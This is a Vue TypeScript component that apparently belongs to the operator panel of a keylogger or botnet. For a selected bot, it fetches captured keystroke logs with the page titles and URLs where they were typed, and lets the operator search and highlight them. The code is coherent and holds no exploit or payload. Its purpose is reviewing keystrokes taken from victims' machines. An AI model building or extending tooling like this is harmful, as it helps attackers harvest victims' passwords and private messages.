<script setup lang="ts">
import { computed, ref, watch } from 'vue'
import { media } from '@/api/endpoints'
import type { KeyboardLogEntry } from '@/types/api'
import Field from '@/components/ui/Field.vue'
import Btn from '@/components/ui/Btn.vue'
import { formatDate } from '@/composables/useTime'

const props = defineProps<{ botId: string }>()
const list = ref<KeyboardLogEntry[]>([])
const loading = ref(false)
const filter = ref('')
const limit = ref(200)

async function load(): Promise<void> {
  loading.value = true
  try {
    list.value = (await media.keyboardLogs(props.botId, limit.value, 0)) ?? []
  } finally {
    loading.value = false
  }
}

watch(() => props.botId, load, { immediate: true })

const filtered = computed(() => {
  const q = filter.value.trim().toLowerCase()
  if (!q) return list.value
  return list.value.filter(
    (k) =>
      k.Keys.toLowerCase().includes(q) ||
      k.Title?.toLowerCase().includes(q) ||
      k.URL?.toLowerCase().includes(q),
  )
})

// Highlight matched substring without dangerously injecting HTML.
function parts(s: string, q: string): { text: string; hi: boolean }[] {
  if (!q) return [{ text: s, hi: false }]
  const out: { text: string; hi: boolean }[] = []
  const lower = s.toLowerCase()
  const ql = q.toLowerCase()
  let i = 0
  let idx = lower.indexOf(ql, i)
  while (idx >= 0) {
    if (idx > i) out.push({ text: s.slice(i, idx), hi: false })
    out.push({ text: s.slice(idx, idx + ql.length), hi: true })
    i = idx + ql.length
    idx = lower.indexOf(ql, i)
  }
  if (i < s.length) out.push({ text: s.slice(i), hi: false })
  return out
}
</script>

<template>
  <div class="space-y-3">
    <div class="flex items-center gap-2">
      <Field
        v-model="filter"
        placeholder="Search keys, title, url"
        size="sm"
        :block="false"
      />
      <select
        v-model.number="limit"
        class="h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle"
        @change="load"
      >
        <option :value="50">last 50</option>
        <option :value="200">last 200</option>
        <option :value="500">last 500</option>
        <option :value="1000">last 1000</option>
      </select>
      <span class="text-[11px] text-fg-faint mono ml-auto">
        {{ filtered.length }} / {{ list.length }} entries
      </span>
      <Btn size="sm" variant="ghost" :loading="loading" @click="load">Reload</Btn>
    </div>

    <div class="surface divide-y divide-border-subtle">
      <div
        v-for="k in filtered"
        :key="k.ID"
        class="px-3 py-2 hover:bg-bg-hover/60"
      >
        <div class="flex items-baseline gap-2">
          <span class="mono text-[10px] text-fg-faint shrink-0">
            {{ formatDate(k.Timestamp) }}
          </span>
          <a
            v-if="k.URL"
            :href="k.URL"
            target="_blank"
            rel="noopener"
            class="text-[11px] truncate hover:text-accent"
            :title="k.URL"
          >
            {{ k.Title || k.URL }}
          </a>
        </div>
        <pre class="mono text-[12px] mt-1 whitespace-pre-wrap break-all leading-relaxed">
<span
  v-for="(p, i) in parts(k.Keys, filter)"
  :key="i"
  :class="p.hi ? 'bg-warn-soft text-warn px-0.5 rounded-sm' : ''"
>{{ p.text }}</span>
        </pre>
      </div>
      <div v-if="!loading && filtered.length === 0" class="text-center py-10 text-fg-faint text-[12px]">
        No keyboard log entries.
      </div>
    </div>
  </div>
</template>
